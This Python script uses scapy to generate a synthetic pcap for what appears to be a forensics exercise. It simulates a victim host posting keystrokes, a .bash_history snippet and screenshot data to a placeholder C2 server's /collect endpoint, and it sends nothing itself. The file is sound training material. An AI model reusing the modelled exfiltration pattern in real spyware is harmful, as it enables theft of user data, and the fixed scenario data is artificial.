"""Deterministic pcap generator for casefile network-capture.pcap."""
from __future__ import annotations

import argparse
import json
import pathlib
import random
from typing import Iterable

from scapy.all import Ether, IP, TCP, Raw, wrpcap

from generators.data import scenario_facts as sf


def _seed() -> random.Random:
    return random.Random(sf.RANDOM_SEED)


def _build_r1_http_post(rng: random.Random, seq: int, ack: int, sample_index: int):
    """One HTTP POST transaction: SYN, SYN-ACK, ACK, PSH-ACK (request), ACK, FIN-ACK pair."""
    victim_ip = "10.13.37.50"
    c2 = sf.C2_IP
    src_port = 40000 + sample_index
    dst_port = sf.C2_HTTP_PORT

    payload = {
        "host": sf.VICTIM_HOSTNAME,
        "user": sf.VICTIM_USERNAME,
        "ts_epoch": 1712332800 + sample_index * sf.EXFIL_INTERVAL_SECONDS,
        "keys": list("hello"[:rng.randint(0, 5)]),
        "files": {
            ".bash_history": "ls -la\ncat Documents/report-draft.txt\n",
        },
        "screenshot_bytes": 8192 + sample_index,
    }
    body = json.dumps(payload, separators=(",", ":"))
    request = (
        f"POST /collect HTTP/1.1\r\n"
        f"Host: {c2}:{dst_port}\r\n"
        f"User-Agent: python-requests/2.32.3\r\n"
        f"Accept-Encoding: gzip, deflate\r\n"
        f"Accept: */*\r\n"
        f"Connection: keep-alive\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
        f"{body}"
    ).encode("utf-8")

    response = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: 17\r\n\r\n"
        b"{\"status\":\"ok\"}\n"
    )

    eth = Ether(src="02:42:ac:11:00:02", dst="02:42:ac:11:00:01")

    def s2c(flags: str, seq_: int, ack_: int, data: bytes = b""):
        tcp = TCP(sport=src_port, dport=dst_port, flags=flags, seq=seq_, ack=ack_)
        pkt = eth / IP(src=victim_ip, dst=c2) / tcp
        return pkt if not data else pkt / Raw(load=data)

    def c2s(flags: str, seq_: int, ack_: int, data: bytes = b""):
        tcp = TCP(sport=dst_port, dport=src_port, flags=flags, seq=seq_, ack=ack_)
        pkt = eth / IP(src=c2, dst=victim_ip) / tcp
        return pkt if not data else pkt / Raw(load=data)

    packets = [
        s2c("S", seq, 0),
        c2s("SA", ack, seq + 1),
        s2c("A", seq + 1, ack + 1),
        s2c("PA", seq + 1, ack + 1, request),
        c2s("A", ack + 1, seq + 1 + len(request)),
        c2s("PA", ack + 1, seq + 1 + len(request), response),
        s2c("A", seq + 1 + len(request), ack + 1 + len(response)),
        s2c("FA", seq + 1 + len(request), ack + 1 + len(response)),
        c2s("FA", ack + 1 + len(response), seq + 2 + len(request)),
    ]
    return packets


def generate(output_path: pathlib.Path, round_num: int) -> None:
    if round_num != 1:
        raise ValueError(f"unknown round: {round_num} (this generator only handles R1)")

    rng = _seed()
    packets: list = []
    base_ts = 1712332800.0  # deterministic epoch anchor
    for i in range(3):
        seq = 1000 + i * 100_000
        ack = 2000 + i * 100_000
        cycle = _build_r1_http_post(rng, seq=seq, ack=ack, sample_index=i)
        for j, pkt in enumerate(cycle):
            pkt.time = base_ts + i * sf.EXFIL_INTERVAL_SECONDS + j * 0.001
        packets.extend(cycle)

    wrpcap(str(output_path), packets)


def main(argv: Iterable[str] | None = None) -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--round", type=int, required=True)
    ap.add_argument("--output", type=pathlib.Path, required=True)
    args = ap.parse_args(argv)
    generate(args.output, args.round)


if __name__ == "__main__":
    main()
